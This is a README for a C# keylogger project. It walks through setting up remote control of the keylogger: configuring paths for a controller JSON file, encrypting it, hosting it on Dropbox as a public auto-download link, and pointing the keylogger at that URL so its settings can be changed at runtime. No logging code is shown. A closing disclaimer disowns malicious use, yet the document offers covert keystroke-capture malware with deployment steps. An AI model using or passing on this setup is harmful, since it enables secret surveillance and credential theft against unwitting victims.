# KeyloggerRemake

https://travis-ci.com/outerme/KeyloggerRemake.svg?branch=master

A complete object-oriented remake of a keylogger I've built in 2016, this time in C#.

In order to make the keylogger work, the following is needed to be done:
1. Get [KeyloggerController](https://github.com/outerme/KeyloggerController)
2. Edit its local json file directory as well as where to encrypt it to
   - In [classJsonObj](https://github.com/outerme/KeyloggerRemake/blob/master/KeyloggerRemake/classJsonObject.cs): Change `strJsonDir = @"ADDYOURDIRECTORYHERE"` to a directory with the local [Json file](https://github.com/outerme/KeyloggerController/blob/master/Controller.json).
      - e.g `strJsonDir = @"C\Users\TestUser\Folder\Controller.json"`
   - In [classJsonObj](https://github.com/outerme/KeyloggerRemake/blob/master/KeyloggerRemake/classJsonObject.cs): Change `strEncryptDir = @"ADDYOURDIRECTORYHERE"` to a directory to save that Json file, encrypted.
      - e.g `strEncryptDir = @"C\Users\TestUser\Folder\EncryptedJson.txt"`
2. Upload the encrypted json file onto a file hosting service like [Dropbox](https://www.dropbox.com/), and get its public link ([Must auto download!](https://www.dropbox.com/help/desktop-web/force-download)).
3. Change KeyloggerRemake's encrypted key to the public link of the specified encrypted directory in the Controller
   - In [classGetEncryption](https://github.com/outerme/KeyloggerRemake/blob/master/KeyloggerRemake/classGetEncryption.cs): Change `strEncryptedFile = "ADDYOURURLHERE"` to the public URL of that encrypted Json file.
      - e.g `strEncryptedFile = "https://www.dropbox.com/s/dsdddq32re/EncryptedJson.txt?dl=1"`
4. Change settings in KeyloggerController upon runtime.


## Packages used:
- Newtonsoft.Json

## Disclaimer:
I don't support the use of this keylogger in a malicious intent, and therefore I hold no responsibility as to what damage it may inflict upon others.
